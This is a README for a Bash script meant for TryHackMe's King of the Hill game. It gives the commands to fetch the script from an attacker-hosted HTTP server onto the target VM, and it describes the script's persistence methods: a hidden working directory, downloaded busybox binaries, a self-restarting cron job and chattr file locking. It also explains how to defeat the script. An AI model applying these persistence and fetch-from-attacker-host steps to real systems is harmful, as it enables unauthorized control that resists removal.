# KingMe
Bash script that helps you maintain your rightful place as king on any Linux box while playing
King of the Hill on TryHackMe.com

## DISCLAIMER
As far as I know, it is not against the rules of THM KotH to use a script like this.
However, I am not responsible if you get banned because you used this script.
Use at your own risk.

## How to use it
Firstly, you must be root on the KotH VM in order for this script to work. 
On your attacker machine in the same directory as KingMe, start an http server to host all the files on port 8080.
This python one-liner works pretty well for that:
`python -m http.server 8080`
Next, on the KotH VM, use curl to get the kingme.sh script like so:
`curl -o kingme.sh <attacker IP>:8080/kingme.sh`
Then, make kingme.sh executable:
`chmod u+x kingme.sh`
Finally, run kingme.sh and take your rightful place as king!

## How it works
KingMe sets up a secret working directory, and then downloads several busybox bins to that
working directory. This will allow the script to run properly even if at some point the bins
on the KotH VM are moved or messed with. The script then sets up a cron job to restart itself in 
case the user's shell is terminated or the script stops running for some reason. Finally, 
the magic happens. Every second KingMe checks /root/king.txt for your username. If it's not 
there, it puts your username in king.txt. It also locks the file with chattr making it more
difficult to edit by other players. This should maintain a player as king indefinitely, unless
another player figures out what's going on and stops it.

## How to defeat KingMe
Remove the cron job that auto starts the script, and delete the working directory that was created.
You can also just use the mount trick to make king.txt read-only.

## Future Plans
- Add counter measures for other king.txt tricks (like the mount trick)
- The little script the cron job calls is sloppy and will start the whole script over
even the downloading the bins and such. Gotta clean that up.
- Re-write this REAME. It's also sloppy. But hey! It's late! Give me a break! haha

## Version Notes
v0.1 - Initial release written after some shower thoughts late at night
